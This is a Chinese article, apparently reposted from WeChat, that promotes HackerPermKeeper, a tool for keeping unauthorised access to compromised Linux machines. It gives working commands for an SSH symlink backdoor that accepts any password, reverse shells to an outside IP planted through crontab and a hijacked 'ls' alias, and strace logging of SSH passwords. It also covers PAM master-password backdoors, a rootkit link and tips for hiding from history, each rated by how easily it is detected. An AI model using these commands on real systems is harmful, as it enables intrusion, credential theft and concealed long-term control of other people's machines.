> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mpc48Ng2sCjH70tXJllgwQ)

        通过渗透拿到权限之后，为了不让权限丢失，都会进行权限维持，而在进行权限维持的时候，红队需要花费大量的时候，来验证是否合适，因此在这款工具就诞生 HackerPermKeeper[黑客权限保持者]

        查看下面的表格可以知道生成的权限维持文件可以运行的 python 版本，但是这个项目本身是 python3 运行的 [我自己的环境是 Python 3.9.7]

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYksgF9DqTHNNq6HG2FrFWNR33RNlPK2sL2iccUgfj2J5Uk9PhneFKXn9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYkkB4r7yUFjLGrpRPNXmDr0GzqD6DcrGNbwpx9icYM0QNL6POyMTESSdQ/640?wx_fmt=png)

```
python3运行此项目[我自己的环境是Python 3.9.7]，但是运行权限维持模块脚本请看上面的表格
安装依赖
pip install -r requirements.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYkQR058FWd5WykkhpN08Ppxib49f4X0ZFzMpwVuDxYPW1wSZ2GNSRIEDQ/640?wx_fmt=png)

```
快速判断目标机器适合的权限维持模块，运行 /check/ 目录下的check.py文件[这个不需要任何依赖环境，python3和python2都支持]
python check.py
python3 check.py
python2 check.py

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYkeJL0KjIFLxYI8DK2UJ4bnodfLvsKwk26Hn1ibjFfYXIibhMg4GwUibPrA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYkggO2eUnTJUp95shjBXmztvaAgicW9KprUrAia579VTrqA6VIuDKz4v1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB0jxzSONmGLuPlZqUQnQtYkR9wymAS972paN67ZUYs0eMPEuf2KxgIjggHIn7wSvWA39WLoNGYtgA/640?wx_fmt=png)

```
OpenSSH后门万能密码&记录密码（这个需要依赖环境），就是把对方的门换个锁，但是原来的钥匙也可以使用
发现程度：||
PAM后门，PAM是一个Linux登录验证的认证服务，修改其中关于ssh登录的验证，添加一个万能密码，已经记录的账号密码位置（类似把对方房间内有内鬼）
发现程度：||
SSH软链接
cat /etc/ssh/sshd_config|grep UsePAM
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
ssh root@xx.xx.xx.xx -p 8888 任意密码登录即可
发现程度：||||||
公私钥
使用密钥进行登录
发现程度：||||||
后门帐号
使用命令添加账号
发现程度：||||||
crontab后计划任务
1、编辑后门反弹
vim /etc/.111.sh
#!/bin/bash
sh -i >& /dev/tcp/192.168.86.137/3434 0>&1
chmod +x /etc/.111.sh
2、添加定时任务
vim /etc/crontab
*/1 * * * * root /etc/.1111.sh
发现程度：||||||
Strace后门
strace是一个动态跟踪工具，它可以跟踪系统调用的执行。
我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围
可以记录ssh明文和密钥（登录的）和Rootkit配合一起
发现程度：||||
命令自定义-Alias后门
alias命令的功能：为命令设置别名
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.86.137/3333 0>&1; };alerts'
执行ls就会反弹shell
持久化+隐藏：重启依旧生效
发现程度：||||
Rootkit后门
https://github.com/f0rb1dd3n/Reptile/releases/
Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。
发现程度：||
但是使用工具进行检测出来情况很大，建议看代码，手动编写此工具（难度很大）
history不记录执行命令
在输入命令时候，添加空格
ssh软链接&crontab
快速生成软链接[需要运行脚本成功后，一分钟连接]，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行
|||||  越多，越容易发发现
||        越少，越难发现，但是部署起来，需要的依赖很多

```

项目地址：https://github.com/RuoJi6/HackerPermKeeper